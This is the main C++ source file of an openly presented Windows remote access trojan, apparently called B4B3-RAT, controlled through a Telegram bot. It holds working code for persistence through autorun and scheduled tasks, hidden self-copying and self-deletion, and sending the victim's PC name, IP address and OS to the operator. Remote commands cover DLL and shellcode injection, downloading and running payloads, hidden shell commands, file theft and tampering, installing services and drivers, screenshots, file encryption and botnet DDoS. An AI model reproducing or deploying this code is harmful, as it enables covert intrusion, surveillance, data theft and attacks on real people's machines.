/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/
#pragma warning(disable: 4996)
#include "common.h"
#include "Manager.h"
#include "Telegram.h"
#include "PrntSc.h"

#include "ProcessManager.h"
#include "FileManager.h"
#include "ServiceManager.h"
#include "ScreenTool.h"
#include "Information.h"
#include "BotNet.h"
#include "Protector.h"
#include "FileCryptor.h"

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, INT) {
	srand((unsigned int)time(NULL));
	Manager::Settings s;
	Manager::ReadData(&s);

	char me[128] = { 0 };
	GetModuleFileNameA(0, me, sizeof(me) - 1);

	HKEY hKey = 0;
	const char* addr = "Software\\4B4DB4B3";
	LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, addr, 0, KEY_READ, &hKey);

	if (result != ERROR_SUCCESS) {
		RegCreateKeyA(HKEY_CURRENT_USER, addr, &hKey);
		
		if (s.autorun_state) {
			if (s.drop_run) {
				Manager::Autorun(s.drop, s.autorun);
			}
			else {
				Manager::Autorun(me, s.autorun);
			}
		}

		if (s.scheduler_state) {
			if (s.drop_run) {
				Manager::Scheduler(s.drop, s.scheduler_name);
			}
			else {
				Manager::Scheduler(me, s.scheduler_name);
			}
		}

		if (s.drop_run) {
			if (std::string(me) != s.drop) {
				CopyFileA(me, s.drop, false);
				ShellExecuteA(0, "open", s.drop, 0, 0, SW_HIDE);

				if (s.auto_delete) {
					std::string batch_autodel = "C:\\Users\\system.bat";
					std::ofstream bat(batch_autodel);
					bat << "@echo off\n";
					bat << "del " + std::string(me);
					bat << "\ndel " + batch_autodel;
					bat.close();

					ShellExecuteA(0, "open", batch_autodel.c_str(), 0, 0, SW_HIDE);
				}

				return 0;
			}
		}
		else {
			ShellExecuteA(0, "open", me, 0, 0, SW_HIDE);
		}

		RegCloseKey(hKey);
	}
	else {
		RegCloseKey(hKey);

		strcpy(s.botapi, Manager::DecryptStr(s.botapi, s.key).c_str());
		if (s.botapi == "") {
			ExitProcess(0);
		}

		Telegram api(s.botapi);
		BotNet botnet;

		SYSTEM_INFO SysInfo;
		GetSystemInfo(&SysInfo);

		if (s.protector) {
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Protector::AntiProcesses, 0, 0, 0);
		}

		int ID = rand();
		std::string information = "User ID: " + std::to_string(ID) + 
			"%0A%0A- Global information:" +
			"%0AName: " + Information::GetPCName() +
			"%0AIP: " + Information::GetIP() +
			"%0AOS: " + Information::GetOS() +
			"%0A%0A- Hardware information: " +
			"%0AOEM ID: " + std::to_string(SysInfo.dwOemId) +
			"%0ANum of processors: " + std::to_string(SysInfo.dwNumberOfProcessors) +
			"%0APage size: " + std::to_string(SysInfo.dwProcessorType) +
			"%0AProcessor: " + Information::GetProcessorBrand() +
			"%0A%0AFor send command to this user, type: /user" + std::to_string(ID) + " [command]"
			"%0A%0AP.S: To show commands: click on \"Test BOT API\" in B4B3-RAT Builder.";
		api.SendTextMessage(s.chatid, information.c_str());

		std::string last;
		std::string prefix = "/user" + std::to_string(ID) + " ";

		std::vector<std::string> params;
		while (true) {
			Sleep(atoi(s.client_delay));

			last = api.GetLastMessageText(atoi(s.chatid));

			if (last.substr(0, prefix.size()) == prefix) {
				std::string command = last.replace(last.find(prefix), prefix.size(), "");
				params = Manager::split(command, ' ');

				// PROCESS MANAGER
				// processes
				if (command == "processes") {
					std::string processes = ProcessManager::ProcessList();
					if (processes != "") {
						api.SendTextMessage(s.chatid, processes.c_str());
					}
					else {
						api.SendTextMessage(s.chatid, "Error! Processes is empty");
					}
				}

				// closeproc process.exe
				else if (params[0] == "closeproc") {
					if (ProcessManager::CloseProcess(params[1])) {
						api.SendTextMessage(s.chatid, "Success! Process has been closed");
					}
					else {
						api.SendTextMessage(s.chatid, "Error! Process isn't closed");
					}
				}

				else if (params[0] == "inject_dll") {
					if (ProcessManager::InjectDLL(params[1].c_str(), params[2].c_str())) {
						api.SendTextMessage(s.chatid, "Success! DLL has been injected");
					}
					else {
						api.SendTextMessage(s.chatid, "Error! DLL isn't injected");
					}
				}

				// inject_shell
				else if (params[0] == "inject_shell") {
					DWORD pid = ProcessManager::PIDByName(params[1]);
					if (pid != 0) {
						if (ProcessManager::InjectShell(pid, params[2])) {
							api.SendTextMessage(s.chatid, "Success! Shellcode is injected");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Shellcode isn't injected");
						}
					}
					else {
						api.SendTextMessage(s.chatid, "Error! Process not found");
					}
				}

				// AUXILIARY
				// loader https://google.com C:\File.exe
				else if (params[0] == "loader") {
					URLDownloadToFileA(0, params[1].c_str(), params[2].c_str(), 0, 0);
					if (Manager::FileExists(params[2])) {
						std::string text = "Success! File is uploaded to: " + params[2];
						api.SendTextMessage(s.chatid, text.c_str());
					}
					else {
						api.SendTextMessage(s.chatid, "Error! File not uploaded!");
					}
				}

				// run C:\File.exe
				else if (params[0] == "run") {
					if (params.size() == 2) {
						ShellExecuteA(0, "open", params[1].c_str(), params[2].c_str(), 0, 0);
						api.SendTextMessage(s.chatid, "Success! Runned with arguments");
					}
					else {
						ShellExecuteA(0, "open", params[1].c_str(), 0, 0, 0);
						api.SendTextMessage(s.chatid, "Success! Runned without arguments");
					}
				}

				// JOKES
				// disable pc
				else if (command == "disable pc") {
					system("shutdown -s");
				}

				// close
				else if (command == "close") {
					ExitProcess(0);
				}

				// disable display
				else if (command == "disable display") {
					SendMessage(NULL, WM_SYSCOMMAND, SC_MONITORPOWER, 2);
				}

				// FILE MANAGER
				//  0    1       2           3
				// dir param C:\Folder [If write: text]
				else if (params[0] == "dir") {
					// if need del_file
					if (params[1] == "del_file") {
						if (DeleteFileA(params[2].c_str())) {
							api.SendTextMessage(s.chatid, "Success! File deleted");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! File was not deleted");
						}
					}

					// if show
					else if (params[1] == "show") {
						std::string objects = FileManager::DirectoryObjectsList(params[2]);
						if (objects != "") {
							api.SendTextMessage(s.chatid, objects.c_str());
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Files not found!");
						}
					}

					else if (params[1] == "read") {
						std::string text = FileManager::ReadFile(params[2]);
						if (text != "") {
							api.SendTextMessage(s.chatid, text.c_str());
						}
						else {
							api.SendTextMessage(s.chatid, "Error! File was not readed");
						}
					}

					else if (params[1] == "write") {
						// dir write C:\path\to\text.txt text example    -  to  -  Text
						std::string write_text = command.replace(0, command.find(params[2]) + params[2].length() + 1, "");
						if (FileManager::WriteFile(params[2], write_text)) {
							api.SendTextMessage(s.chatid, "Success! Text is written");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Text was not written");
						}
					}
				}

				// SERVICE MANAGER
				else if (params[0] == "service") {
					// service show
					if (params[1] == "show") {
						std::string services = ServiceManager::ServiceList();
						if (services != "") {
							api.SendTextMessage(s.chatid, services.c_str());
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Services is empty");
						}
					}

					//  1     2          3                     4                         5            6
					// add [Name] [DisplayName] [C:\\ProgramData\\yourdriver.sys] [Type-Driver] [Start-Type] 
					else if (params[1] == "add") {
						DWORD Type = ServiceManager::ParseTypeDriver(params[5]);
						DWORD StartType = ServiceManager::ParseStartTypeDriver(params[6]);

						if (Type == 0 || StartType == 0) {
							api.SendTextMessage(s.chatid, "Error! Service not added");
						}
						else {
							if (ServiceManager::AddSvc(params[2], params[3], params[4], Type, StartType)) {
								api.SendTextMessage(s.chatid, "Success! Service has been added");
							}
							else {
								api.SendTextMessage(s.chatid, "Error! Service not added");
							}
						}
					}

					//    1      2
					// delete [Name]
					else if (params[1] == "delete") {
						if (ServiceManager::DeleteSvc(params[2])) {
							api.SendTextMessage(s.chatid, "Success! Service has been deleted");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Service not deleted");
						}
					}

					//  1      2
					// start [Name]
					else if (params[1] == "start") {
						if (ServiceManager::StartSvc(params[2])) {
							api.SendTextMessage(s.chatid, "Success! Service has been started");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Service not started");
						}
					}

					// 1      2
					// stop [Name]
					else if (params[1] == "stop") {
						if (ServiceManager::StopSvc(params[2])) {
							api.SendTextMessage(s.chatid, "Success! Service has been stopped");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Service not stopped");
						}
					}
				}

				// SYSTEM
				else if (params[0] == "system") {
					// Deleted  Delete --- this cmd ---
					// user[ID] system ping google.com
					try {
						std::string cmd = command.replace(command.find("system "), 7, "");

						char windir[128] = { 0 };
						if (GetWindowsDirectoryA(windir, sizeof(windir) - 1) != 0) {
							ShellExecuteA(NULL, "open", std::string(std::string(windir) + "\\System32\\cmd.exe").c_str(), cmd.c_str(), 0, SW_HIDE);
							api.SendTextMessage(s.chatid, "Success! Command is runned");
						}
						else {
							api.SendTextMessage(s.chatid, "Error! Windows directory is null");
						}
					}
					catch (std::exception) {
						api.SendTextMessage(s.chatid, "Error! Recheck the parameters");
					}
				}

				// SCREENSHOT
				else if (params[0] == "screenshot") {
					std::string filename = std::to_string(rand()) + ".jpeg";

					if (ScreenTool::GDIScreen(filename)) {
						std::string url = PrntSc::UploadImage("B4DB4B3", filename.c_str());
						api.SendTextMessage(s.chatid, url.c_str());

						DeleteFileA(filename.c_str());
					}
					else {
						api.SendTextMessage(s.chatid, "Error! Screenshot was not created");
					}
				}

				// FILE CRYPTOR
				else if (params[0] == "filecrypt") {
					if (FileCryptor::FileCrypt(params[1], params[2])) {
						api.SendTextMessage(s.chatid, "Success! File crypted");
					}
					else {
						api.SendTextMessage(s.chatid, "Error! File not crypted. Maybe, file not found?");
					}
				}

				else if (params[0] == "filedecrypt") {
					if (FileCryptor::FileDecrypt(params[1], params[2])) {
						api.SendTextMessage(s.chatid, "Success! File decrypted");
					}
					else {
						api.SendTextMessage(s.chatid, "Error! File not decrypted");
					}
				}
			}
			else if (last == "/online") {
				api.SendTextMessage(s.chatid, information.c_str());
			}

			//    0         1              2
			// /botnet start/stop https://google.com
			else if (last.substr(0, 7) == "/botnet") {
				std::vector<std::string> params = Manager::split(last, ' ');
				if (params[1] == "start") {
					botnet.Start((char*)params[1].c_str());
					std::string text = prefix + ": Started BotNet DDOS!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
				else if (params[1] == "stop") {
					botnet.Stop();
					std::string text = prefix + ": Stopped BotNet DDOS!";
					api.SendTextMessage(s.chatid, text.c_str());
				}
			}
		}
	}

	return 0;
}